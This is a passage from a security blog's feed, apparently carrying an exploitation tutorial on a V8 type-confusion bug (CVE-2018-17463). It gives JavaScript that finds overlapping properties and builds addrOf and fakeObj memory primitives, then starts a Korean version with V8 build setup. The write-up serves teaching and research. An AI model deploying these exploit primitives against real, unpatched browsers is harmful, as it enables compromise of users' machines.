class="hljs-params">()</span> </span>{    let obj = {<span class="hljs-keyword">inline</span>: <span class="hljs-number">1234</span>};    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">32</span>; i++) {        Object.defineProperty(obj, <span class="hljs-string">&apos;p&apos;</span> + i, {            writable: <span class="hljs-literal">true</span>,            value: -i        });    }    <span class="hljs-keyword">return</span> obj;}<span class="hljs-comment">// Function that finds a pair of properties where p1 is stored at the same offset</span><span class="hljs-comment">// in the FixedArray as p2 in the NameDictionary</span>let p1, p2;<span class="hljs-function">function <span class="hljs-title">findOverlappingProperties</span><span class="hljs-params">()</span> </span>{    <span class="hljs-comment">// Create an array of all 32 property names such as p1..p32</span>    let pNames = [];    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {        pNames[i] = <span class="hljs-string">&apos;p&apos;</span> + i;    }    <span class="hljs-comment">// Create eval of our vuln function that will generate code during runtime</span>    eval(`    function vuln(obj) {      <span class="hljs-comment">// Access Property inline of obj, forcing a CheckMap operation</span>      obj.<span class="hljs-keyword">inline</span>;      <span class="hljs-comment">// Force a Map Transition via our side-effect</span>      <span class="hljs-keyword">this</span>.Object.create(obj);      <span class="hljs-comment">// Trigger our type-confusion by accessing out-of-bound properties</span>      ${pNames.<span class="hljs-built_in">map</span>((p) =&gt; `let ${p} = obj.${p};`).join(<span class="hljs-string">&apos;\n&apos;</span>)}      return [${pNames.join(&apos;, &apos;)}];    }  `)    <span class="hljs-comment">// JIT code to trigger vuln</span>    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-comment">// Create Object and pass it to Vuln function</span>        let res = vuln(makeObj());        <span class="hljs-comment">// Look for overlapping properties in results</span>        <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">1</span>; i &lt; res.length; i++) {            <span class="hljs-comment">// If i is not the same value, and res[i] is between -32 and 0, it overlaps</span>            <span class="hljs-keyword">if</span> (i !== -res[i] &amp;&amp; res[i] &lt; <span class="hljs-number">0</span> &amp;&amp; res[i] &gt; <span class="hljs-number">-32</span>) {                [p1, p2] = [i, -res[i]];                <span class="hljs-keyword">return</span>;            }        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] Failed to find overlapping properties&quot;</span>;}print(<span class="hljs-string">&quot;[+] Finding Overlapping Properties...&quot;</span>);findOverlappingProperties();print(`[+] Properties p${p1} <span class="hljs-keyword">and</span> p${p2} overlap!`);</code></pre><p><img src="image%208.png" alt="image.png"></p><p>As mentioned, NameDictionary&#x2019;s property placement is randomized at runtime, so you must discover pairs dynamically like this. Now that we have such a pair, let&#x2019;s see how to use it to get Read/Write primitives!</p><h3 id="The-addrOf-Read-Primitive"><a href="#The-addrOf-Read-Primitive" class="headerlink" title="The addrOf Read Primitive"></a>The addrOf Read Primitive</h3><p>Create an inline object that stores a <code>double</code> and then create another object that will be stored in the backing store, then trigger the Type Confusion. The result is that an object pointer gets interpreted as a <code>double</code>.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrOf</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-comment">// 1. Dynamically generate vuln function (bypass Map check)</span>    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      // We expect p1 to be a Double, but actually p2 (an Object pointer) is loaded</span><span class="hljs-string">      return obj.p<span class="hljs-subst">${p1}</span>.x; </span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>}; <span class="hljs-comment">// the target object whose address we want</span>    <span class="hljs-keyword">let</span> pValues = [];    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>}; <span class="hljs-comment">// Double (expected type)</span>    pValues[p2] = {<span class="hljs-attr">y</span>: obj}; <span class="hljs-comment">// Object (actually loaded value)</span>    <span class="hljs-comment">// 2. Drive JIT optimization and induce type confusion</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-comment">// If the return value is not 13.37 (i.e., an address leaked), success</span>        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            <span class="hljs-keyword">return</span> res.toBigInt() - <span class="hljs-number">1n</span>; <span class="hljs-comment">// return address and remove tag</span>        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>}</code></pre><p>Below is the Read Primitive code that includes the function above (if you want the pointer untagging logic, replace with the function above).</p><pre><code class="hljs c"><span class="hljs-comment">// Function that creates an object with one in-line and 32 out-of-line properties</span><span class="hljs-function">function <span class="hljs-title">makeObj</span><span class="hljs-params">(pValues)</span> </span>{    let obj = {<span class="hljs-keyword">inline</span>: <span class="hljs-number">1234</span>};    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {        Object.defineProperty(obj, <span class="hljs-string">&apos;p&apos;</span> + i, {            writable: <span class="hljs-literal">true</span>,            value: pValues[i]        });    }    <span class="hljs-keyword">return</span> obj;}<span class="hljs-comment">// Function that finds a pair of properties where p1 is stored at the same offset</span><span class="hljs-comment">// in the FixedArray as p2 in the NameDictionary</span>let p1, p2;<span class="hljs-function">function <span class="hljs-title">findOverlappingProperties</span><span class="hljs-params">()</span> </span>{    <span class="hljs-comment">// Create an array of all 32 property names such as p1..p32</span>    let pNames = [];    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {        pNames[i] = <span class="hljs-string">&apos;p&apos;</span> + i;    }    <span class="hljs-comment">// Create eval of our vuln function that will generate code during runtime</span>    eval(`    function vuln(obj) {      <span class="hljs-comment">// Access Property inline of obj, forcing a CheckMap operation</span>      obj.<span class="hljs-keyword">inline</span>;      <span class="hljs-comment">// Force a Map Transition via our side-effect</span>      <span class="hljs-keyword">this</span>.Object.create(obj);      <span class="hljs-comment">// Trigger our type-confusion by accessing out-of-bound properties</span>      ${pNames.<span class="hljs-built_in">map</span>((p) =&gt; `let ${p} = obj.${p};`).join(<span class="hljs-string">&apos;\n&apos;</span>)}      return [${pNames.join(&apos;, &apos;)}];    }  `)    <span class="hljs-comment">// Create an array of negative values from -1 to -32 to be used</span>    <span class="hljs-comment">// for out makeObj function</span>    let pValues = [];    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">32</span>; i++) {        pValues[i] = -i;    }    <span class="hljs-comment">// JIT code to trigger vuln</span>    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-comment">// Create Object and pass it to Vuln function</span>        let res = vuln(makeObj(pValues));        <span class="hljs-comment">// Look for overlapping properties in results</span>        <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">1</span>; i &lt; res.length; i++) {            <span class="hljs-comment">// If i is not the same value, and res[i] is between -32 and 0, it overlaps</span>            <span class="hljs-keyword">if</span> (i !== -res[i] &amp;&amp; res[i] &lt; <span class="hljs-number">0</span> &amp;&amp; res[i] &gt; <span class="hljs-number">-32</span>) {                [p1, p2] = [i, -res[i]];                <span class="hljs-keyword">return</span>;            }        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] Failed to find overlapping properties&quot;</span>;}<span class="hljs-function">function <span class="hljs-title">addrOf</span><span class="hljs-params">()</span> </span>{    eval(`    function vuln(obj) {      obj.<span class="hljs-keyword">inline</span>;      <span class="hljs-keyword">this</span>.Object.create(obj);      <span class="hljs-comment">// Trigger our type-confusion by accessing an out-of-bound property</span>        <span class="hljs-comment">// This will load p1 from our object thinking it&apos;s a Double, but instead</span>        <span class="hljs-comment">// due to overlap, it will load p2 which is an Object</span>      <span class="hljs-keyword">return</span> obj.p${p1}.x;    }  `);    let obj = {z: <span class="hljs-number">1234</span>};    let pValues = [];    pValues[p1] = {x: <span class="hljs-number">13.37</span>};    pValues[p2] = {y: obj};    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        let res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            %DebugPrint(obj);            <span class="hljs-keyword">return</span> res;        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>}print(<span class="hljs-string">&quot;[+] Finding Overlapping Properties...&quot;</span>);findOverlappingProperties();print(`[+] Properties p${p1} <span class="hljs-keyword">and</span> p${p2} overlap!`);let x = addrOf();print(<span class="hljs-string">&quot;[+] Leaking Object Address...&quot;</span>);print(`[+] Object Address: ${x}`);</code></pre><p>When you run the code in <code>d8</code>, you get a result like this:</p><p><img src="image%209.png" alt="image.png"></p><p>The output labeled <code>Object Address</code> is printed in double format because it&#x2019;s interpreted as a <code>double</code>. So you need to convert that double to an address &#x2014; the conversion shown above will give you the address!</p><h3 id="The-fakeObj-Write-Primitive"><a href="#The-fakeObj-Write-Primitive" class="headerlink" title="The fakeObj Write Primitive"></a>The fakeObj Write Primitive</h3><p>You can get a write primitive by doing the reverse of the read primitive &#x2014; no new vulnerability is required. That&#x2019;s one of the strengths of Type Confusion: if a pointer is being interpreted as a double (and reading the pointer leaked an address), then writing to a double slot (via the same confusion) can instead write into the pointer&#x2019;s target.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      let orig = obj.p<span class="hljs-subst">${p1}</span>.x;</span><span class="hljs-string">      // Overwrite property x of p1, but due to type confusion</span><span class="hljs-string">      // we overwrite property y of p2</span><span class="hljs-string">      obj.p<span class="hljs-subst">${p1}</span>.x = 0x41414141n;</span><span class="hljs-string">      return orig;</span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>};    <span class="hljs-keyword">let</span> pValues = [];    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>};    pValues[p2] = {<span class="hljs-attr">y</span>: obj};    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            <span class="hljs-keyword">return</span> res;        }    }}</code></pre><p>If you replace the <code>let x = addrOf();</code> line in the Read primitive code with a call to <code>fakeObj()</code> and run it in <code>d8</code>, you&#x2019;ll get results like below. As you can see, the <code>obj</code> pointer&#x2019;s address is overwritten with <code>0x41414141</code>. Isn&#x2019;t Type Confusion a delightfully simple way to get primitives? &#x1F604;</p><p><img src="image%2010.png" alt="image.png"></p><p>Now that we have a read primitive for addresses and a write primitive that can overwrite an object pointer, the next step would be to refine these into full arbitrary memory read/write primitives (AAR/AAW) for exploitation. I intended to cover that here but ran out of space and want to produce a higher-quality write-up, so I&#x2019;ll move that content to the next part.</p><p>In the next part I&#x2019;ll explain how Read/Write primitives in the Chrome renderer lead to RCE, and how renderer RCE changed after the Heap Sandbox was introduced. I&#x2019;ll be back soon &#x2014; see you next time! :)</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://jhalon.github.io/chrome-browser-exploitation-1/">https://jhalon.github.io/chrome-browser-exploitation-1/</a></p><p><a href="https://jhalon.github.io/chrome-browser-exploitation-2/">https://jhalon.github.io/chrome-browser-exploitation-2/</a></p><p><a href="https://jhalon.github.io/chrome-browser-exploitation-3/">https://jhalon.github.io/chrome-browser-exploitation-3/</a></p><p><a href="https://ssd-disclosure.com/ssd-advisory-chrome-type-confusion-in-jscreateobject-operation-to-rce/">https://ssd-disclosure.com/ssd-advisory-chrome-type-confusion-in-jscreateobject-operation-to-rce/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://hackyboiz.github.io/tags/Type-Confusion/">Type Confusion</category>
      
      <category domain="https://hackyboiz.github.io/tags/Type-Confusion-101/">Type Confusion 101</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chrome/">Chrome</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chromium/">Chromium</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2018-17463/">CVE-2018-17463</category>
      
      
      <comments>https://hackyboiz.github.io/2025/09/26/OUYA77/Chrome_part3/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Type Confusion 101으로 시작하는 Chrome Exploit ^-^☆Part 3.(KR)</title>
      <link>https://hackyboiz.github.io/2025/09/26/OUYA77/Chrome_part3/kr/</link>
      <guid>https://hackyboiz.github.io/2025/09/26/OUYA77/Chrome_part3/kr/</guid>
      <pubDate>Fri, 26 Sep 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;, OUYA77&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. 2025&amp;#xB144;&amp;#xB3C4;&amp;#xAC00; &amp;#xC5B4;&amp;#xB290;&amp;#xB367; 4&amp;#xBD84;</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, OUYA77&#xC785;&#xB2C8;&#xB2E4;. 2025&#xB144;&#xB3C4;&#xAC00; &#xC5B4;&#xB290;&#xB367; 4&#xBD84;&#xAE30;&#xC5D0; &#xC811;&#xC5B4;&#xB4DC;&#xB824;&#xACE0; &#xD558;&#xACE0; &#xC788;&#xB124;&#xC694;. &#xD658;&#xC808;&#xAE30; &#xAC10;&#xAE30; &#xC870;&#xC2EC;&#xD558;&#xC2DC;&#xACE0; &#xB0A8;&#xC740; &#xC62C;&#xD574;&#xB3C4; &#xD6C4;&#xD68C;&#xC5C6;&#xC774; &#xBCF4;&#xB0B4;&#xC2DC;&#xB294; &#xC5EC;&#xB7EC;&#xBD84; &#xB418;&#xAE38; &#xC751;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4; b </p><p>Part 1. &#xC5D0;&#xC11C;&#xB294; &#xD06C;&#xB86C;&#xC758; &#xC804;&#xCCB4; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xC558;&#xACE0;, Part 2. &#xC5D0;&#xC11C;&#xB294; Type Confusion&#xC774;&#xB77C;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; V8 &#xC5D4;&#xC9C4;&#xC5D0;&#xC11C; &#xC5B4;&#xB5BB;&#xAC8C; &#xBC1C;&#xC0DD;&#xD558;&#xACE0;, &#xC774;&#xAC83;&#xC774; &#xC65C; Relative R/W&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294;&#xC9C0; &#xB2E4;&#xB8E8;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xC548;&#xBCF4;&#xC168;&#xB2E4;&#xBA74;<br>&#x2192; <a href="https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/kr/">[Research] Type Confusion 101&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; Chrome Exploit ^-^&#x2606; Part 1.</a><br>&#x2192; <a href="https://hackyboiz.github.io/2025/07/30/OUYA77/Chrome_part2/kr/">[Research] Type Confusion 101&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; Chrome Exploit ^-^&#x2606; Part 2.</a></p></blockquote><p>&#xC774;&#xBC88;&#xC5D4; &#xAE00; &#xC880;&#xB9CC; &#xC4F0;&#xACE0; &#xCC10;&#xD55C; &#xD3EC;&#xB108;&#xBE14;&#xC758; &#xD5A5;&#xAE30;&#xB97C; &#xB290;&#xB07C;&#xAE30; &#xC704;&#xD574; &#xC9C0;&#xB09C; &#xC2DC;&#xAC04;&#xC758; &#xB0B4;&#xC6A9;&#xC740; Relative R/W&#xB9CC; Recap &#xD558;&#xACE0; &#xC2E4;&#xC81C; exploit&#xC5D0;&#xC11C;&#xC758; payload&#xB97C; &#xAC19;&#xC774; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;! &#xAC08; &#xAE38;&#xC774; &#xBA38;&#xB2C8; &#xBC14;&#xC090; &#xAC00;&#xBD05;&#xC2DC;&#xB2E4; :)</p><h2 id="0-Relative-R-W-Recap"><a href="#0-Relative-R-W-Recap" class="headerlink" title="0. Relative R/W Recap"></a>0. Relative R/W Recap</h2><p><img src="image.png" alt="image.png"></p><p>V8&#xC740; &#xC131;&#xB2A5; &#xCD5C;&#xC801;&#xD654;&#xB97C; &#xC704;&#xD574; &#xAC1D;&#xCCB4;&#xC758; &#xAD6C;&#xC870;&#xAC00; &#xBCC0;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xAC83;&#xC774;&#xB77C;&#xB294; &#xAC00;&#xC815; &#xC544;&#xB798; Hidden Class(Maps)&#xC640; ElementsKind &#xAC19;&#xC740; &#xB0B4;&#xBD80; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC815;&#xBCF4;&#xB4E4;&#xC744; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; V8&#xC758; JIT &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xC778; TurboFan&#xC740; &#xACE0;&#xC131;&#xB2A5;&#xC758; &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB294; &#xB9E4;&#xC6B0; &#xB3D9;&#xC801;&#xC778; &#xC5B8;&#xC5B4;&#xC5EC;&#xC11C;, <strong>&#xB7F0;&#xD0C0;&#xC784;&#xC5D0; &#xAC1D;&#xCCB4; &#xAD6C;&#xC870;&#xB098; &#xBC30;&#xC5F4; &#xD0C0;&#xC785;&#xC774; &#xBCC0;&#xACBD;&#xB418;&#xBA74; &#xC774; &#xAC00;&#xC815;&#xC774; &#xAE68;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;</strong>. &#xC774;&#xB54C; V8&#xC774; &#xC801;&#xC808;&#xD788; &#xAE30;&#xC874;&#xC758; &#xCD5C;&#xC801;&#xD654;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; deoptimize &#xD558;&#xC9C0; &#xBABB;&#xD558;&#xBA74;, &#xC798;&#xBABB;&#xB41C; &#xD0C0;&#xC785; &#xC815;&#xBCF4;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB418;&#xBA74;&#xC11C; &#xC704; &#xADF8;&#xB9BC;&#xACFC; &#xAC19;&#xC774; Relative R/W&#xAC00; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; &#xACFC;&#xAC70; &#xD06C;&#xB86C; &#xBC84;&#xC804;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xC5EC; Type Confusion &#xC73C;&#xB85C; Relative Address R/W primitive&#xB97C; &#xC5BB;&#xACE0; Arbitary Address R/W&#xB85C; &#xB2E4;&#xB4EC;&#xC5B4; Code Execution&#xC73C;&#xB85C; &#xAC00;&#xB294; &#xC5EC;&#xC815;&#xC744; &#xAC19;&#xC774; &#xB5A0;&#xB098;&#xBCF4;&#xC2DC;&#xC8E0;! &#xC774;&#xBC88; &#xD3EC;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; Heap Sandbox &#xC774;&#xC804; era&#xC5D0;&#xC11C;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574; &#xB2E4;&#xB8E8;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="1-Environments-Set-up"><a href="#1-Environments-Set-up" class="headerlink" title="1. Environments Set-up"></a>1. Environments Set-up</h2><p>Set-up&#xC740; &#xC798; &#xC815;&#xB9AC;&#xB41C; &#xAE00;&#xC774; &#xC788;&#xC5B4;&#xC11C; &#xBCF8; &#xD3EC;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xAE38;&#xAC8C; &#xB2E4;&#xB8E8;&#xC9C0; &#xC54A;&#xACE0;, &#xC81C;&#xAC00; &#xD574;&#xBCF4;&#xBA74;&#xC11C; &#xC911;&#xC694;&#xD588;&#xC5C8;&#xB358; &#xBD80;&#xBD84;&#xB9CC; &#xCCA8;&#xC5B8;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>Set-up &#xB9C1;&#xD06C;&#x2192; <a href="https://gist.github.com/jhalon/5cbaab99dccadbf8e783921358020159">https://gist.github.com/jhalon/5cbaab99dccadbf8e783921358020159</a></p></blockquote><p>Windows SDK &#xBC84;&#xC804;&#xB4E4;&#xC744; &#xC798; &#xB9DE;&#xCDB0;&#xC8FC;&#xC154;&#xC57C; &#xD558;&#xACE0; depot_tools&#xC5D0; python3.bat&#xC774; &#xC788;&#xB294;&#xAC8C; &#xC774;&#xAC8C; cmd&#xCC3D;&#xC5D0;&#xC11C; where python &#xD588;&#xC744; &#xB54C;, depot_tools&#xC5D0; &#xC788;&#xB294; python3.bat&#xC774; &#xB098;&#xC640;&#xC57C;&#xD574;&#xC11C; python.bat&#xC73C;&#xB85C; symbolic link&#xB97C; &#xAC78;&#xC5B4;&#xC8FC;&#xC2DC;&#xACE0; &#xD658;&#xACBD;&#xBCC0;&#xC218; PATH&#xC5D0;&#xC11C;&#xB3C4; depot_tools&#xC758; &#xC704;&#xCE58;&#xB97C; &#xCD5C;&#xC0C1;&#xB2E8;&#xC73C;&#xB85C; &#xB193;&#xC544;&#xC8FC;&#xC138;&#xC694;. &#xBE4C;&#xB4DC;&#xD560; &#xB54C; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;!</p><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; SDK <code>10.0.26100.0</code> &#xC774; &#xBC84;&#xC804;&#xC73C;&#xB85C; &#xBE4C;&#xB4DC;&#xB418;&#xB2C8; visual studio installer &#xC5D0;&#xC11C; &#xBC84;&#xC804; &#xC815;&#xBCF4; &#xC798; &#xD655;&#xC778;&#xD574;&#xC11C; &#xB2E4;&#xC6B4;&#xBC1B;&#xC544;&#xC8FC;&#xC138;&#xC694;(<code>tools\dev\gm.py x64.debug</code> &#xC5D0; &#xBC84;&#xC804;&#xC774; &#xD558;&#xB4DC;&#xCF54;&#xB529;&#xB418;&#xC5B4;&#xC788;&#xC5B4;&#xC11C; &#xC6EC;&#xB9CC;&#xD558;&#xBA74; &#xBC84;&#xC804; &#xB9DE;&#xCDB0;&#xC11C; &#xBE4C;&#xB4DC;&#xD574;&#xC8FC;&#xB294;&#xAC8C; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;).</p><pre><code class="hljs jsx">c:\dev\source\v8&gt;python3 tools\dev\gm.py x64.debug# gn gen out\x64.debugDone. Made <span class="hljs-number">740</span> targets <span class="hljs-keyword">from</span> <span class="hljs-number">225</span> files <span class="hljs-keyword">in</span> <span class="hljs-number">6288</span>ms# autoninja -C out\x64.debug d8offline modeninja: Entering directory <span class="hljs-string">`out\x64.debug&apos;</span><span class="hljs-string">exec_root=C:\dev\source\v8 dir=out\x64.debug</span><span class="hljs-string">build finished</span><span class="hljs-string">local:2609 remote:0 cache:0 cache-write:0(err:0) fallback:0 retry:0 skip:312</span><span class="hljs-string">fs: ops: 41931(err:5273) / r:12710(err:0) 20.66GiB / w:122(err:0) 100.98MiB</span><span class="hljs-string"> resource/capa used(err)  wait-avg |   s m |  serv-avg |   s m |</span><span class="hljs-string">  localexec/32   2527(0)  4m03.72s |&#x2582; &#x2582;&#x2582;&#x2587;&#x2588;&#x2583;|    10.08s | &#x2582;&#x2584;&#x2587;&#x2588;&#x2582; |</span><span class="hljs-string">14m13.39s Build Succeeded: 2609 steps - 3.06/s</span><span class="hljs-string">Done! - V8 compilation finished successfully.</span></code></pre><p>&#xC704;&#xC640; &#xAC19;&#xC774; &#xAE30;&#xBD84;&#xC88B;&#xC740; <code>Done!</code>&#xC774; &#xB098;&#xC624;&#xBA74; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xCE58;&#xB97C; &#xC644;&#xB8CC;&#xD55C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;! &#x1F64C;</p><p>&#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xC5D4;&#xC9C4;&#xC778; <strong>V8</strong>&#xC740; &#xC6B0;&#xB9AC;&#xAC00; &#xC791;&#xC131;&#xD55C; &#xCF54;&#xB4DC;&#xB97C; &#xBC14;&#xB85C; &#xAE30;&#xACC4;&#xC5B4;&#xB85C; &#xBC88;&#xC5ED;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB300;&#xC2E0;, <strong>&#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;</strong>&#xB77C;&#xB294; &#xC911;&#xAC04; &#xC5B8;&#xC5B4;&#xB85C; &#xBA3C;&#xC800; &#xBCC0;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xB294; <strong>Ignition &#xC778;&#xD130;&#xD504;&#xB9AC;&#xD130;</strong>&#xAC00; &#xC2E4;&#xD589;&#xD558;&#xBA70;, &#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xBD80;&#xBD84;&#xC740; <strong>TurboFan &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;</strong>&#xAC00; &#xCD5C;&#xC801;&#xD654;&#xD558;&#xC5EC; &#xB354; &#xBE60;&#xB978; &#xAE30;&#xACC4;&#xC5B4;&#xB85C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798;&#xB294; <code>Array.from(String(&apos;12345&apos;))</code>&#xB77C;&#xB294; &#xAC04;&#xB2E8;&#xD55C; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xCF54;&#xB4DC;&#xB97C; <code>d8</code> &#xC258;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD588;&#xC744; &#xB54C; &#xC0DD;&#xC131;&#xB41C; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xC758; &#xD575;&#xC2EC; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image%201.png" alt="image.png"></p><p><code>Array.from(String(&apos;12345&apos;))</code></p><p>&#xC774; &#xCF54;&#xB4DC;&#xB294; &#xD06C;&#xAC8C; &#xB450; &#xB2E8;&#xACC4;&#xB85C; &#xB098;&#xB269;&#xB2C8;&#xB2E4;.</p><ol><li><code>String(&apos;12345&apos;)</code>&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xBB38;&#xC790;&#xC5F4; &#xAC1D;&#xCCB4;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>Array.from()</code>&#xC744; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xBB38;&#xC790;&#xC5F4; &#xAC1D;&#xCCB4;&#xB97C; &#xBC30;&#xC5F4;&#xB85C; &#xBCC0;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC774; &#xB450; &#xB2E8;&#xACC4;&#xB294; V8 &#xC5D4;&#xC9C4; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; <strong>&#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;</strong>&#xB77C;&#xB294; &#xC911;&#xAC04; &#xC5B8;&#xC5B4;&#xB85C; &#xD45C;&#xD604;&#xB429;&#xB2C8;&#xB2E4;. &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xC640; &#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#xC5B4;&#xB294; &#xB458; &#xB2E4; 